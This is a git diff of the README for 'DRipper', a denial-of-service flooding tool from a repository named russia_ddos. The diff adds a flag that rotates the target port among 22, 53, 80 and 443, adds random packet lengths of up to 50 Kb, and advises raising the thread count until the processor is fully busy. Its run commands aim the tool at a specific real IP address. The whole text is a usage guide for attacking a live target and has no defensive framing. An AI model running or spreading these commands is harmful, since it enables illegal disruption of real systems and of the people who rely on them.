@@ -16,16 +16,18 @@ Ensure you have Python 3 installed. Then clone this repo and run main.py with pa
 
 -s - IP;
 
--p - port (default 80);
+-p - port (default - random from (22, 53, 80, 443) for every packet sending);
 
 -t - threads count. The most important setting. Try to keep the processor busy up to 100%.
+
+-r - send packets with random length (up to 50 Kb)
 
 ```bash
 git clone https://github.com/alexmon1989/russia_ddos.git
 cd russia_ddos
 
 # run
-python -u DRipper.py -s 213.24.76.23 -p 80 -t 100
+python -u DRipper.py -s 213.24.76.23 -p 80 -t 100 -r 1
 # OR
-python3 -u DRipper.py -s 213.24.76.23 -p 80 -t 100
+python3 -u DRipper.py -s 213.24.76.23 -p 80 -t 100 -r 1
 ```
